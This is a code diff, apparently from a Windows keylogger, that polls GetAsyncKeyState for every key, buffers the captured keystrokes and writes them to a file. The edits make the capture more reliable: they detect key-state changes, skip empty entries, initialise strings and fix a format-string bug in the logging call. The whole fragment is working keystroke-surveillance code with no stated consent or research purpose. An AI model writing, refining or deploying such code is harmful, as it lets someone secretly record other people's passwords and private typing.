@@ -69,7 +69,7 @@ bool wasStatusKeysUpdate()
     for (int i = 1; i < KEYS_NUMBER; ++i)
     {
         state = (bool)GetAsyncKeyState(i);
-        flag |= state && !mKeys[i];
+        flag |= state != mKeys[i];
         mKeys[i] = state;
     }
     return flag;
@@ -79,10 +79,9 @@ bool wasStatusKeysUpdate()
 
 void rememberPressedKeys()
 {
-    char str[MAX_STRING_SIZE] = "\0";
-    getPressedKeys(str);
-    strcpy(mBuffer[mBufferSize], str);
-    ++mBufferSize;
+    getPressedKeys(mBuffer[mBufferSize]);
+    if (strcmp(mBuffer[mBufferSize], "") != 0)
+        ++mBufferSize;
     if (mBufferSize == MAX_BUFFER_SIZE)
         writeKeysToFile();
 }
@@ -109,10 +108,7 @@ void writeKeysToFile()
     if (!file)
         return;
     for (int i = 0; i < mBufferSize; ++i)
-    {
-        fprintf(file, mBuffer[i]);
-        fprintf(file, "\n");
-    }
+        fprintf(file, "%s\n", mBuffer[i]);
     fclose(file);
     mBufferSize = 0;
 }
@@ -121,6 +117,7 @@ void writeKeysToFile()
 
 void getPressedKeys(char* str)
 {
+    str[0] = '\0';
     char key[MAX_KEY_SIZE];
     int cnt = MAX_STRING_SIZE / MAX_KEY_SIZE;
     for (int i = 0; i < KEYS_NUMBER; ++i)
